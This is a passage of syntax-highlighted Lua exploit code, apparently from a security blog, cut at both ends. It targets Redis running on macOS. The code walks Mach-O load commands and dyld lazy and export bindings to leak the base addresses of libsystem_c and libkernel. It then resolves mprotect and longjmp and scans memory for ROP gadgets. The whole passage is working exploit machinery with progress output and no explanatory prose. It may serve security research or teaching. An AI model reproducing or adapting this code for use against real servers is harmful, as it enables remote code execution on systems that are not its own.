</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">mprotect</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[+] found mprotect symbol &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">mprotect_addr</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_exports_dyld_info</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">export_binding_info_offset</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">export_binding_info_size</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">44</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">opcode_offset</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span><span class="n">export_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">process_export_bindings</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">export_binding_info_size</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_libkernel_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">parse_exports_dyld_info</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">mprotect_addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">process_lazy_bindings</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current_symbol</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">symbols</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">op</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">immediate</span> <span class="o">=</span> <span class="n">op</span> <span class="o">%</span> <span class="mi">16</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">op</span> <span class="o">-</span> <span class="n">immediate</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x70</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB]]</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">=</span> <span class="n">immediate</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x40</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM]]</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x10</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_SET_DYLIB_ORDINAL_IMM]]</span>
</span><span class='line'>      <span class="cm">--[[ignore]]</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x90</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_DO_BIND]]</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] parsed_symbol &quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> =&gt; &quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s">:&quot;</span> <span class="o">..</span> <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">table.insert</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">current_symbol</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">old_symbol</span> <span class="o">=</span> <span class="n">current_symbol</span>
</span><span class='line'>      <span class="n">current_symbol</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">segment</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">segment</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">offset</span>
</span><span class='line'>      <span class="n">current_symbol</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">old_symbol</span><span class="p">.</span><span class="n">name</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="k">then</span>
</span><span class='line'>      <span class="cm">--[[BIND_OPCODE_DONE]]</span>
</span><span class='line'>      <span class="cm">--[[ignore]]</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">found unknown opcode in lazy bindings &quot;</span> <span class="o">..</span> <span class="n">opcode</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">symbols</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_dyld_info</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">lazy_binding_info_offset</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">lazy_binding_size</span> <span class="o">=</span>   <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">36</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">opcode_offset</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span><span class="n">lazy_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">process_lazy_bindings</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">lazy_binding_size</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_symbol</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">symbols</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">symbols</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span> <span class="o">==</span> <span class="n">symbol</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">symbols</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">leak_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">resolved_symbol</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">resolved_symbol</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> symbol&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> symbol: &quot;</span> <span class="o">..</span> <span class="n">resolved_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[we assume the pointer is into the data segment. #TODO FIX THIS]]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">location</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">data_location</span><span class="p">,</span> <span class="n">resolved_symbol</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">address</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">location</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found &quot;</span> <span class="o">..</span> <span class="n">symbol</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> location: &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">macho_address</span> <span class="o">=</span> <span class="n">findmacho</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">[*] found &#39;</span> <span class="o">..</span> <span class="n">name</span> <span class="o">..</span> <span class="s1">&#39;</span><span class="s"> macho base address: &#39;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">macho_address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">macho_address</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_redis_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">longjmp_location</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">libsystem_c</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">libkernel</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">symbols</span> <span class="o">=</span> <span class="n">parse_dyld_info</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="kd">local</span> <span class="n">data_location</span> <span class="o">=</span> <span class="n">segment_location</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__DATA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      <span class="n">libsystem_c</span> <span class="o">=</span> <span class="n">leak_macho</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">libsystem_c&quot;</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_strlen&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">libkernel</span> <span class="o">=</span> <span class="n">leak_macho</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">libkernel&quot;</span><span class="p">,</span> <span class="n">data_location</span><span class="p">,</span> <span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_getrlimit&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="kd">local</span> <span class="n">longjmp</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">_longjmp&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">longjmp</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">longjmp</span> <span class="o">=</span> <span class="n">find_symbol</span><span class="p">(</span><span class="n">symbols</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__longjmp&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">longjmp</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find _longjmp symbol&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="n">longjmp_location</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">data_location</span><span class="p">,</span> <span class="n">longjmp</span><span class="p">.</span><span class="n">offset</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[+] Found longjump jump location &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">longjmp_location</span><span class="p">))</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segments</span> <span class="o">=</span> <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">redis</span> <span class="o">=</span> <span class="n">macho_offset</span><span class="p">,</span> <span class="n">longjmp_address</span> <span class="o">=</span> <span class="n">longjmp_location</span><span class="p">,</span> <span class="n">libsystem_c</span> <span class="o">=</span> <span class="n">libsystem_c</span><span class="p">,</span> <span class="n">libkernel</span> <span class="o">=</span> <span class="n">libkernel</span><span class="p">,</span> <span class="n">redis_segments</span> <span class="o">=</span> <span class="n">segments</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">matches</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">expected</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">~=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_insn</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">expected</span><span class="p">,</span> <span class="n">libc</span><span class="p">,</span> <span class="n">offsets</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">expected</span> <span class="o">&gt;=</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">error</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">failed assertion&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">offsets</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">offsets</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>    <span class="cm">--[[apparently we can do unaligned reads :) :)]]</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">word</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="ow">and</span> <span class="n">matches</span><span class="p">(</span><span class="n">expected</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">find_rops</span><span class="p">(</span><span class="n">rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">literals</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">rop</span> <span class="k">in</span> <span class="nb">ipairs</span><span class="p">(</span><span class="n">rops</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">literals</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">literal</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">re</span> <span class="o">=</span> <span class="n">join</span><span class="p">(</span><span class="n">dotstar</span><span class="p">(),</span> <span class="n">alternation</span><span class="p">(</span><span class="n">literals</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">found_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">remaining</span> <span class="o">=</span> <span class="o">#</span><span class="n">rops</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="ow">and</span> <span class="n">remaining</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_restart</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_push_byte</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">FINAL</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">]</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>          <span class="n">remaining</span> <span class="o">=</span> <span class="n">remaining</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class='line'>          <span class="n">found_rops</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">]</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">)</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">found_rops</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- offset search for named rops only works if rop_size &lt;= 8 bytes because it only reads</span>
</span><span class='line'><span class="c1">-- a single word. slightly dodgy</span>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">find_rops_and_assert</span><span class="p">(</span><span class="n">named_rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">missing_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">inverted</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">rop</span><span class="p">,</span> <span class="n">detail</span> <span class="k">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">named_rops</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">find_insn</span><span class="p">(</span><span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">rop</span><span class="p">,</span> <span class="n">libc</span><span class="p">,</span> <span class="n">detail</span><span class="p">.</span><span class="n">offsets</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">addr</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[-] Missing rop at fixed location will search: &quot;</span> <span class="o">..</span> <span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">table.insert</span><span class="p">(</span><span class="n">missing_rops</span><span class="p">,</span> <span class="n">rop</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found rop: &quot;</span> <span class="o">..</span> <span class="n">detail</span><span class="p">.</span><span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>      <span class="n">inverted</span><span class="p">[</span><span class="n">detail</span><span class="p">.</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">missing_rops</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">found_rops</span> <span class="o">=</span> <span class="n">find_rops</span><span class="p">(</span><span class="n">missing_rops</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="n">missing_rops</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">rop</span> <span class="o">=</span> <span class="n">missing_rops</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">]</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Failed to find rop: &quot;</span> <span class="o">..</span> <span class="n">named_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">].</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>      <span class="k">else</span>
